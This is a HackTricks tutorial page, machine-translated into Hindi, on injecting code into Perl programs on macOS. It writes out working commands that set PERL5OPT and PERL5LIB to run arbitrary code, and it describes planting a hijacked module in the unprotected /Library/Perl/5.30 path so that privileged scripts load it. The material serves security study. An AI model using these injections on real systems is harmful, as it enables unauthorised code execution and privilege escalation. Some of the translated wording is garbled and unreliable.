# macOS Perl एप्लिकेशन्स इंजेक्शन

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> के साथ जीरो से हीरो तक AWS हैकिंग सीखें!</summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी कंपनी का विज्ञापन **HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **PRs** सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>

## `PERL5OPT` और `PERL5LIB` env वेरिएबल के माध्यम से

`PERL5OPT` एनवायरनमेंट वेरिएबल का उपयोग करके पर्ल को विभिन्न कमांड्स को निषेध करने की संभावना है।\
उदाहरण के लिए, इस स्क्रिप्ट बनाएं:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

अब **एनवी वेरिएबल निर्यात करें** और **पर्ल** स्क्रिप्ट को निष्पादित करें:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
एक और विकल्प है कि एक Perl मॉड्यूल बनाया जाए (उदाहरण: `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

और फिर env variables का उपयोग करें:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## डिपेंडेंसी के माध्यम से

Perl चलाने के डिपेंडेंसी फ़ोल्डर का क्रम सूचीबद्ध करना संभव है:
```bash
perl -e 'print join("\n", @INC)'
```
कुछ इस प्रकार की चीज वापस देगा:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
कुछ फोल्डर वापस लौटाए गए में से कुछ भी मौजूद नहीं है, हालांकि, **`/Library/Perl/5.30`** मौजूद है, यह **SIP** द्वारा **सुरक्षित नहीं है** और यह **SIP द्वारा सुरक्षित फोल्डरों से पहले** है। इसलिए, कोई व्यक्ति उस फोल्डर का दुरुपयोग करके वहां स्क्रिप्ट डिपेंडेंसी जोड़ सकता है ताकि एक उच्च विशेषाधिकार Perl स्क्रिप्ट इसे लोड करें।

{% hint style="warning" %}
हालांकि, ध्यान दें कि आपको **उस फोल्डर में लिखने के लिए रूट होना चाहिए** और आजकल आपको यह **TCC प्रॉम्प्ट** मिलेगा:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

उदाहरण के लिए, अगर कोई स्क्रिप्ट **`use File::Basename;`** आयात कर रहा है तो `/Library/Perl/5.30/File/Basename.pm` बनाने से यह संभव होगा कि यह विचारशील कोड को निष्पादित करें।

## संदर्भ

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
